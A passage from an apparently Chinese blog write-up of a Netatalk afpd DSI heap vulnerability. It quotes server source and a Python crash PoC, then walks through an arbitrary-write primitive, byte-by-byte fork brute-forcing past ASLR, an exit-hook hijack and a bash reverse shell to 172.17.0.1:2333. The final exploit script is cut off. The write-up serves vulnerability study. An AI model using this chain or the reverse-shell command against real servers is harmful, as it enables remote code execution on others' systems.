class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">"dsi_stream_receive: DSI cmdlen: %zd"</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>写个Poc打一发,</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="number">''</span></span><br><span class="line">payload += b<span class="number">'</span>\x01<span class="number">'</span></span><br><span class="line">payload += b<span class="number">'</span>\xff<span class="number">'</span></span><br><span class="line">payload += b<span class="number">'</span>a<span class="number">'</span>*<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">lenth = len(payload)</span><br><span class="line"></span><br><span class="line">header = b<span class="number">''</span></span><br><span class="line">header += b<span class="number">'</span>\x00<span class="number">'</span> <span class="meta">#flags</span></span><br><span class="line">header += b<span class="number">'</span>\x04<span class="number">'</span> <span class="meta">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="meta">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="meta">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="meta">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br></pre></td></tr></tbody></table></figure><p>在解引用rcx+r9时崩溃<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401272105426.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401272105881.png"><br>对应到源码是,崩溃的原因是command指针已经破坏.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br></pre></td></tr></tbody></table></figure><p>既然无法直接造成glibc级别的堆溢出(刚造的词),需要靠之前提过的DSI结构的几个字段进行利用,那么需要进一步分析一下整体流程,以及这几个字段的使用.</p><p>仅展示部分代码.<br>主进程循环通过poll调用等待连接事件,通过dsi_getsession设置会话(dsi),fork出子进程在afp_over_dsi中执行dsi命令.<br>套接字的socket,bind,listen以及会话的初始化在configinit中完成,poll的监听集合在init_listening_sockets中初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (afp_config_parse(&amp;obj, <span class="string">"afpd"</span>) != <span class="number">0</span>)</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (configinit(&amp;obj) != <span class="number">0</span>) {</span><br><span class="line">            LOG(log_error, logtype_afpd, <span class="string">"config re-read: no servers configured"</span>);</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(init_listening_sockets(&amp;obj))) {</span><br><span class="line">            LOG(log_error, logtype_afpd, <span class="string">"main: couldn't initialize socket handler"</span>);</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line">        }</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        ret = poll(asev-&gt;fdset, asev-&gt;used, <span class="number">-1</span>);</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; asev-&gt;used; i++) {</span><br><span class="line">            <span class="keyword">if</span> (asev-&gt;fdset[i].revents &amp; (POLLIN | POLLERR | POLLHUP | POLLNVAL)) {</span><br><span class="line">                <span class="keyword">switch</span> (asev-&gt;data[i].fdtype) {</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> LISTEN_FD:</span><br><span class="line">                    <span class="keyword">if</span> ((child = dsi_start(&amp;obj, (DSI *)(asev-&gt;data[i].private), server_children))) {</span><br><span class="line">                        <span class="keyword">if</span> (!(asev_add_fd(asev, child-&gt;afpch_ipc_fd, IPC_FD, child))) {</span><br><span class="line">                            LOG(log_error, logtype_afpd, <span class="string">"out of asev slots"</span>);</span><br><span class="line">                            ......</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    ......</span><br><span class="line">                } <span class="comment">/* switch */</span></span><br><span class="line">            }  <span class="comment">/* if */</span></span><br><span class="line">        } <span class="comment">/* for (i)*/</span></span><br><span class="line">    } <span class="comment">/* while (1) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">afp_child_t</span> *<span class="title function_">dsi_start</span><span class="params">(AFPObj *obj, DSI *dsi, <span class="type">server_child_t</span> *server_children)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">afp_child_t</span> *child = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi_getsession(dsi, server_children, obj-&gt;options.tickleval, &amp;child) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_error, logtype_afpd, <span class="string">"dsi_start: session error: %s"</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we've forked. */</span></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="literal">NULL</span>) {</span><br><span class="line">        configfree(obj, dsi);</span><br><span class="line">        afp_over_dsi(obj); <span class="comment">/* start a session */</span></span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> child;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>接下来来看会话的设置.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">    -&gt;dsi_start</span><br><span class="line">        -&gt;dsi_getsession</span><br><span class="line">            -&gt;dsi_tcp_open : 读取dsi数据包,建立连接</span><br><span class="line">                -&gt;dsi_init_buffer : 分配(预)读取缓冲区(dsi-&gt;command,dsi-&gt;buffer)</span><br><span class="line">                -&gt;dsi_stream_read : 从socket中读取数据</span><br><span class="line">            -&gt;dsi_opensession : 设置session(漏洞函数)</span><br><span class="line">        -&gt;afp_over_dsi : 读取dsi数据包,执行命令</span><br><span class="line">            -&gt;dsi_stream_receive : 从socket中读取数据</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Allocate DSI read buffer and read-ahead buffer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dsi_init_buffer</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ((dsi-&gt;commands = <span class="built_in">malloc</span>(dsi-&gt;server_quantum)) == <span class="literal">NULL</span>) {</span><br><span class="line">        LOG(log_error, logtype_dsi, <span class="string">"dsi_init_buffer: OOM"</span>);</span><br><span class="line">        AFP_PANIC(<span class="string">"OOM in dsi_init_buffer"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dsi_peek() read ahead buffer, default is 12 * 300k = 3,6 MB (Apr 2011) */</span></span><br><span class="line">    <span class="keyword">if</span> ((dsi-&gt;buffer = <span class="built_in">malloc</span>(dsi-&gt;dsireadbuf * dsi-&gt;server_quantum)) == <span class="literal">NULL</span>) {</span><br><span class="line">        LOG(log_error, logtype_dsi, <span class="string">"dsi_init_buffer: OOM"</span>);</span><br><span class="line">        AFP_PANIC(<span class="string">"OOM in dsi_init_buffer"</span>);</span><br><span class="line">    }</span><br><span class="line">    dsi-&gt;start = dsi-&gt;buffer;</span><br><span class="line">    dsi-&gt;eof = dsi-&gt;buffer;</span><br><span class="line">    dsi-&gt;end = dsi-&gt;buffer + (dsi-&gt;dsireadbuf * dsi-&gt;server_quantum);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* accept the socket and do a little sanity checking */</span></span><br><span class="line"><span class="type">static</span> <span class="type">pid_t</span> <span class="title function_">dsi_tcp_open</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    SOCKLEN_T len;</span><br><span class="line"></span><br><span class="line">    len = <span class="keyword">sizeof</span>(dsi-&gt;client);</span><br><span class="line">    dsi-&gt;socket = accept(dsi-&gt;serversock, (<span class="keyword">struct</span> sockaddr *) &amp;dsi-&gt;client, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TCPWRAP</span></span><br><span class="line">    {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">request_info</span> <span class="title">req</span>;</span></span><br><span class="line">        request_init(&amp;req, RQ_DAEMON, <span class="string">"afpd"</span>, RQ_FILE, dsi-&gt;socket, <span class="literal">NULL</span>);</span><br><span class="line">        fromhost(&amp;req);</span><br><span class="line">        <span class="keyword">if</span> (!hosts_access(&amp;req)) {</span><br><span class="line">            LOG(deny_severity, logtype_dsi, <span class="string">"refused connect from %s"</span>, eval_client(&amp;req));</span><br><span class="line">            close(dsi-&gt;socket);</span><br><span class="line">            errno = ECONNREFUSED;</span><br><span class="line">            dsi-&gt;socket = <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* TCPWRAP */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi-&gt;socket &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    getitimer(ITIMER_PROF, &amp;itimer);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (pid = fork()) ) { <span class="comment">/* child */</span></span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">timer</span> =</span> {{<span class="number">0</span>, <span class="number">0</span>}, {DSI_TCPTIMEOUT, <span class="number">0</span>}};</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">newact</span>, <span class="title">oldact</span>;</span></span><br><span class="line">        <span class="type">uint8_t</span> block[DSI_BLOCKSIZ];</span><br><span class="line">        <span class="type">size_t</span> stored;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* reset signals */</span></span><br><span class="line">        server_reset_signal();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="comment">/* install an alarm to deal with non-responsive connections */</span></span><br><span class="line">        newact.sa_handler = timeout_handler;</span><br><span class="line">        sigemptyset(&amp;newact.sa_mask);</span><br><span class="line">        newact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        sigemptyset(&amp;oldact.sa_mask);</span><br><span class="line">        oldact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        setitimer(ITIMER_PROF, &amp;itimer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((sigaction(SIGALRM, &amp;newact, &amp;oldact) &lt; <span class="number">0</span>) ||</span><br><span class="line">            (setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)) {</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: %s"</span>, strerror(errno));</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_SYS);</span><br><span class="line">        }</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        dsi_init_buffer(dsi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in commands. this is similar to dsi_receive except</span></span><br><span class="line"><span class="comment">         * for the fact that we do some sanity checking to prevent</span></span><br><span class="line"><span class="comment">         * delinquent connections from causing mischief. */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the first two bytes */</span></span><br><span class="line">        len = dsi_stream_read(dsi, block, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!len ) {</span><br><span class="line">            <span class="comment">/* connection already closed, don't log it (normal OSX 10.3 behaviour) */</span></span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLOSED);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span> || (block[<span class="number">0</span>] &gt; DSIFL_MAX) || (block[<span class="number">1</span>] &gt; DSIFUNC_MAX)) {</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: invalid header"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the rest of the header */</span></span><br><span class="line">        stored = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; DSI_BLOCKSIZ) {</span><br><span class="line">            len = dsi_stream_read(dsi, block + stored, <span class="keyword">sizeof</span>(block) - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">        dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_code, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_code));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">        dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">        dsi-&gt;cmdlen = min(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">        stored = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; dsi-&gt;cmdlen) {</span><br><span class="line">            len = dsi_stream_read(dsi, dsi-&gt;commands + stored, dsi-&gt;cmdlen - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stop timer and restore signal handler */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;timer, <span class="number">0</span>, <span class="keyword">sizeof</span>(timer));</span><br><span class="line">        setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>);</span><br><span class="line">        sigaction(SIGALRM, &amp;oldact, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        LOG(log_info, logtype_dsi, <span class="string">"AFP/TCP session from %s:%u"</span>,</span><br><span class="line">            getip_string((<span class="keyword">struct</span> sockaddr *)&amp;dsi-&gt;client),</span><br><span class="line">            getip_port((<span class="keyword">struct</span> sockaddr *)&amp;dsi-&gt;client));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send back our pid */</span></span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>于是我们可以得出一个任意写原语,覆盖dsi-&gt;command,再次发送数据包即可在dsi_stream_receive完成任意写入.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>“世界上最遥远的距离,是任意地址写和ASLR”</p></blockquote><p>利用环境: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27,保护全开(CANARY,PIE,ASLR,FULL RELRO).</p><p>由于ASLR和PIE的开启,我们没有任何已知地址.常用的绕过手段是Partial Overwrite.<br>然而command的堆空间是mmap出来的,无法通过部分覆写使其偏移到某个空闲堆块的管理指针.<br>(图中0x7fdfe6658010即command指针)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281133295.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281120961.png"></p><p>另一种ASLR的绕过防法是Fork爆破(更常见的是canary的绕过),由于父子进程拥有相同的地址空间,可以使用子进程进行逐字节爆破,若子进程崩溃,父进程不受影响.若子进程正常,则说明该字节爆破正确.<br>而据之前的分析,该程序处理的逻辑确实在fork出的子进程中.于是便可逐字节覆盖command指针进行爆破.</p><p>这里提一下怎么验证地址是否泄露正确.<br>先set follow-fork-mode parent(因为子进程会段错误卡住),然后continue并开始爆破.由于command的地址空间是fork后在子进程中开辟的,所以需要切换到子进程才可见.set follow-fork-mode child,在dsi_opensession下断点,然后continue并发一个普通的连接包,当断点触发我们已经在子进程中了,vmmap查看地址布局.<br>发现我们爆破出的地址并不是command的地址,而是低地址空间的另一处合法可写地址.<br>不过稍加分析可以得知,这个地址与libc基址之间的偏移是固定的,调试出的偏移是0x5245ff0.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281314678.png"></p><p>glibc2.27劫持控制流还是比较easy的,直接exit_hook即可(CTF术语,实则是_rtld_global._dl_rtld_lock_recursive和_rtld_global._dl_load_lock),可以在exit时完成一次func(arg)的函数调用.与传统CTF不同,这里需要执行system(bash -c “bash -i&gt;&amp; /dev/tcp/172.17.0.1/2333 0&lt;&amp;1”). 因为传统的CTF pwn时直接将标准输入输出重定向到网络连接中,直接起shell即可.</p><p>(下图中应该布置为__libc_system,没有那个+32,截图有误)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281509578.png"></p><p>最后提一点,看一些wp中劫持exit_hook后是断开连接后等待相应进程退出(exit),其实不用等,从DSI协议标准中就能看出断开的方法:发个DSICloseSession的包即可.</p><blockquote><p>Session closure can be initiated by either side by sending DSICloseSession. The sender does not need to wait for a reply and should immediately close the session after sending the message.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(cmd) {</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DSIFUNC_CLOSE:</span><br><span class="line">    LOG(log_debug, logtype_afpd, <span class="string">"DSI: close session request"</span>);</span><br><span class="line">    afp_dsi_close(obj);</span><br><span class="line">    LOG(log_note, logtype_afpd, <span class="string">"done"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>注意字节序即可,DSI数据包是大端序,程序是小端序.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 